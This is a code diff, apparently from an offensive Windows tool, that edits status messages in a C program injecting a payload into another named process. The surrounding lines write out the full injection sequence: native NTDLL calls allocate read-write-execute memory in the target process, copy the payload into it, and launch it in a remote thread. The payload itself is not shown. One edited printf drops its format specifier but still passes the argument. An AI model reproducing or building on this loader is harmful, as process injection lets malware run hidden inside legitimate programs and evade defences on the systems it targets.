@@ -160,7 +160,7 @@ int main(int argc, char* argv[]){
     void* rBaseAddres = NULL;
 
     if(argc != 2 || argv[1] == NULL){
-        printf("\n%s Usage: %s <process name>", err, argv[0]);
+        printf("\n%s Usage: %s <process name>\n ", err, argv[0]);
         return EXIT_FAILURE;
     }
 
@@ -184,7 +184,7 @@ int main(int argc, char* argv[]){
         return EXIT_FAILURE;
     }
 
-    printf("\n%s Got handle to NTDLL %s 0x%p", ok, ar, &hNTDLL);
+    printf("\n%s Got handle to NTDLL %s 0x", ok, ar, &hNTDLL);
 
     printf("\n%s Finding NTDLL Function Addresses", ok);
 
@@ -212,10 +212,10 @@ int main(int argc, char* argv[]){
     }
 
     status = NtAllocateVirtualMemory(hProc, &rBaseAddres, 0, (PULONG)&payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-    printf("\n%s Allocated %zu bytes in %s %s 0x%p", ok, sizeof(payload), procname, ar, &rBaseAddres);
+    printf("\n%s Allocated %zu bytes in %s %s 0x%p", ok, sizeof(payload), procname, ar, rBaseAddres);
 
     status = NtWriteVirtualMemory(hProc, rBaseAddres, payload, sizeof(payload), NULL);
-    printf("\n%s Wrote %zu bytes in %s %s 0x%p", ok, sizeof(payload), procname, ar, &rBaseAddres);
+    printf("\n%s Wrote %zu bytes in %s %s 0x%p", ok, sizeof(payload), procname, ar, rBaseAddres);
 
     status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, rBaseAddres, NULL, 0, 0, 0, 0, NULL);
 
